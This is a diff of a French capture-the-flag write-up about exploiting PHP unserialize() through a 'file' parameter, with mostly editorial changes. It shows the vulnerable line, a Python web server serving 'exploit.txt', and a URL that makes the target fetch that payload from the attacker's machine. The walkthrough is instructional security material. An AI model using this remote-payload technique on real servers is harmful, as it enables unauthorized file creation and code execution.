@@ -169,7 +169,13 @@ unserialize(file_get_contents($file_name));<br />
 
 C'est intéressant d'avoir ce code. J'apprend comment fonctionne le fameux paramètre `GET` nommé `file`. Après quelques recherches, je tombe sur [cet article écrit par une équipe de pentesters](https://notsosecure.com/remote-code-execution-php-unserialize) qui ont trouvé un moyen d'exploiter cet exact bout de code PHP, réussissant à créer un nouveau fichier sur le serveur vulnérable.
 
-La clé de l'exploitation se trouve à la ligne 22 `unserialize(file_get_contents($file_name));` où le programme désérialise directement la valeur contenue dans le fichier entré dans le paramètre `file` sans aucune vérification. De plus, le code définit une classe `file` dont la méthode magique `__destruct()` créer un fichier sur le serveur contenant la valeur stockée dans la propriété `data`.
+La clé de l'exploitation se trouve à la ligne 22 :
+
+```php
+unserialize(file_get_contents($file_name));
+```
+
+Le programme désérialise directement la valeur contenue dans le fichier entré dans le paramètre `file` sans aucune vérification. De plus, le code définit une classe `file` dont la méthode magique `__destruct()` créer un fichier sur le serveur contenant la valeur stockée dans la propriété `data`.
 
 Donc, pour résumer, si je parviens à faire en sorte que la valeur du paramètre `file` contienne un fichier ayant un objet de cette classe déjà sérialisé, la désérialisation puis la destruction de cet objet déclencheront automatiquement la création d’un fichier sur la machine.
 
@@ -187,7 +193,7 @@ J'ouvre ensuite un serveur web Python au niveau du dossier dans lequel `exploit.
 python3 -m http.server
 ```
 
-Il ne me reste plus qu'à ouvrir la page dans Firefox avec le paramètre `file` pointant vers mon propre serveur web et vers mon fichier `exploit.txt`, c'est à dire l'URL suivant :
+Il ne me reste plus qu'à ouvrir la page dans Firefox avec le paramètre `file` pointant vers mon propre serveur web et vers mon fichier `exploit.txt`, c'est à dire l'URL suivante :
 
 ```txt
 http://[ip-machine-vulnerable]/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/?file=http://[ip-ma-machine]:8000/exploit.txt
